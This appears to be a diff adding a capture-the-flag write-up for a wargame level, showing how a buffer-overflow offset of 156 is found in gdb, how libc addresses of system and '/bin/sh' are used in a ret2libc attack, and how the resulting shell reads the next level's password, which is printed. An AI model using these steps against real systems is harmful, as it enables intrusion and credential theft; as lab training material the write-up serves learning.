@@ -1,0 +1,41 @@
+To follow child process instead of parent:
+
+---> set follow-fork-mode child
+
+This level is similiar to level01, system and "/bin/sh" keep their addresses so step to find them would not be described here yet again
+The only thing is left to be found is the size of offset. It colud be done with the help of https://wiremask.eu/tools/buffer-overflow-pattern-generator/
+and manually:
+
+(gdb) r
+The program being debugged has been started already.
+Start it from the beginning? (y or n) y
+Starting program: /home/users/level04/level04 
+[New process 1693]
+Give me some shellcode, k
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAB
+
+Program received signal SIGSEGV, Segmentation fault.
+[Switching to process 1693]
+0xf7004241 in ?? ()
+
+we send 158 symbols to input, which resulted in segmentation, in the end of address (0xf7004241) we can see 2 symbols (B and A), which means offset is 156
+
+0xf7e6aed0  system
+0xf7f897ec  '/bin/sh'
+
+copy python script from local machine to remote
+$ scp -P 4242 ./level04/exploit.py level04@localhost:/tmp/
+
+$ (python /tmp/exploit.py ; cat - ) | ./level04
+Give me some shellcode, k
+whoami
+level05
+cat /home/users/level05/.pass 
+3v8QLcN5SAhPaZZfEasfmXdwyR59ktDEMAwHF3aN
+
+Flag is found!
+
+$ su level05
+Password: 
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
